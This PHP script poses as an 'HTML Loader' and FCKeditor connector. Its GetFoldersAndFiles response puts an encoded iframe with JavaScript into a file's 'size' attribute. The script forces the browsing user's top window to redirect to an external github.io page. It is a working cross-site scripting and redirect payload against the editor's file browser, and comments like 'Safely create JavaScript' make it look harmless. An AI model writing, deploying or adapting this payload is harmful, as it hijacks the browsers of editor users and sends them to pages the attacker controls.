<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
// hhtoplk HTML Loader + Pixireel-style FCKeditor Connector

$sourceDir = realpath(__DIR__);
$baseUrl = 'https://hhtoplk.github.io/id/';

// Check source folder
if ($sourceDir === false || !is_dir($sourceDir)) {
    http_response_code(500);
    exit('Source folder not found');
}


// Read Content ID from query or clean URL
$id = $_GET['jd'] ?? '';

if ($id === '') {
    $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    $id = basename($path);
}

if (!is_string($id)) {
    $id = '';
}

$id = preg_replace('/\.html$/i', '', $id);

if (!is_string($id)) {
    $id = '';
}

$id = preg_replace('/\.html$/i', '', $id);


// XML attribute escaping helper
function xmlAttr($value) {
    return htmlspecialchars(
        $value,
        ENT_QUOTES | ENT_XML1,
        'UTF-8'
    );
}

// FCKeditor Connector
$command = $_GET['Command'] ?? '';

if ($command !== '') {

    header('Content-Type: text/xml; charset=UTF-8');
    header('Cache-Control: no-store');

    echo '<?xml version="1.0" encoding="UTF-8"?>';

    echo '<Connector command="' . xmlAttr($command) .
         '" resourceType="Document">';

    // Match Pixireel CurrentFolder structure
    echo '<CurrentFolder path="/1 - f/" url="//" />';

    if ($command === 'GetFolders') {

        echo '<Folders></Folders>';

    } elseif ($command === 'GetFoldersAndFiles') {

        echo '<Files>';

        // Always show Loading first. The redirected HTML Loader validates the ID.
        $redirectUrl = $baseUrl;

        if ($id !== '') {
            $redirectUrl = $baseUrl . rawurlencode($id) . '.html';
        }

        // Safely create JavaScript
        $jsUrl = json_encode(
    $redirectUrl,
    JSON_HEX_TAG |
    JSON_HEX_APOS |
    JSON_HEX_AMP |
    JSON_HEX_QUOT |
    JSON_UNESCAPED_SLASHES
);

        $script = '<script>window.top.location.href=' .
                  $jsUrl . ';</script>';

        // Encode script for nested iframe srcdoc
        $innerSrcdoc = htmlspecialchars(
            $script,
            ENT_QUOTES | ENT_HTML5,
            'UTF-8'
        );

        // Build the iframe
        $iframe = '<iframe height="0" width="0" srcdoc="' .
                  $innerSrcdoc .
                  '"></iframe>';

        // Encode complete iframe for XML
        $encodedIframe = xmlAttr($iframe);

       echo '<File desc="1" name="Loading..." size="' . $encodedIframe . '" />';

        echo '</Files>';

    } else {

        echo '<Error number="1" />';

    }

    echo '</Connector>';
    exit;
}

// Normal HTML Loader: validate the ID and locate the HTML file after redirect
$idValid = (
    $id !== '' &&
    preg_match('/^[a-zA-Z0-9_-]+$/', $id)
);

$file = false;
$fileValid = false;

if ($idValid) {
    $file = realpath(
        $sourceDir . DIRECTORY_SEPARATOR . $id . '.html'
    );

    $fileValid = (
        $file !== false &&
        dirname($file) === $sourceDir &&
        is_file($file) &&
        is_readable($file)
    );
}

if (!$fileValid) {
    http_response_code(404);
    exit('HTML File Not Found');
}

header('Content-Type: text/html; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store');
header('Content-Security-Policy: sandbox allow-scripts allow-forms');

readfile($file);
exit;
